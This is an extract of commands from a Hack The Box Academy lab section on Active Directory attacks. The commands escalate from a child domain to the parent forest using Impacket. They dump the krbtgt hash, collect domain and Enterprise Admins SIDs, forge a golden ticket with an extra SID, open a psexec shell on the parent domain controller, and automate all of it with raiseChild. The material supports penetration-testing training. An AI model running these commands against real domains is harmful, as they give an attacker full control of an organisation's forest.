# Section 29: Attacking Domain Trusts - Child -> Parent Trusts - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1508
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

```bash
impacket-secretsdump logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

```bash
impacket-lookupsid logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 
```

```bash
impacket-lookupsid logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

```bash
impacket-lookupsid logistics.{{DOMAIN}}/htb-student_adm@{{DC_IP}} | grep -B12 "Enterprise Admins"
```

```bash
impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.{{DOMAIN_UPPER}} -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

```bash
export KRB5CCNAME=hacker.ccache
```

```bash
impacket-psexec LOGISTICS.{{DOMAIN_UPPER}}/hacker@academy-ea-dc01.{{DOMAIN}} -k -no-pass -target-ip {{DC_IP}}
whoami
hostname
```

```bash
impacket-raiseChild -target-exec {{DC_IP}} LOGISTICS.{{DOMAIN_UPPER}}/htb-student_adm
whoami
exit
```

```python
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

